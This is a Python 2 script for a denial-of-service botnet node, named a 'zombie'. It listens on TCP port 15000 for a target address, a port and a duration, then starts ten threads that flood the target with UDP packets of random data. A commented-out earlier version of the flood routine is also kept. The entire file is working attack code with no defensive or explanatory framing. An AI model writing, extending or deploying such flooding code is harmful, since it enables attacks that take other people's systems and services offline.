import SocketServer
import threading
import time
import socket
import random
import os

N = 10

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        timeout, target, port = self.data.split(" ")
        self.request.sendall("ACK")

        for i in xrange(N):
            attack = attackModule(timeout, target, port, i)
            attack.start()

        print "ended attack"

    """
    def attack(self, timeout, target, port):
        print "start attack: ", timeout, " ", target, " ", port
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(50000)

        start = time.clock()
        while time.clock() - start < timeout:
            #port = random.randint(1, 65535)
            victim.sendto(MESSAGE, (target, port))
    """

class attackModule(threading.Thread):
    def __init__(self, timeout, target, port, num):
        threading.Thread.__init__(self)
        self.timeout = timeout
        self.target = target
        self.port = int(port)

        # for debugging
        self.num = num

    def run(self):
        print "entered attack thread ", self.num
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(1024)

        start = time.clock()
        while time.clock() - start < self.timeout:
            victim.sendto(MESSAGE, (self.target, self.port))

        print "ended attack run"

if __name__ == '__main__':
    HOST = socket.gethostbyname(socket.gethostname())
    PORT = 15000

    server = SocketServer.TCPServer((HOST, PORT), zombie)
    server.serve_forever()
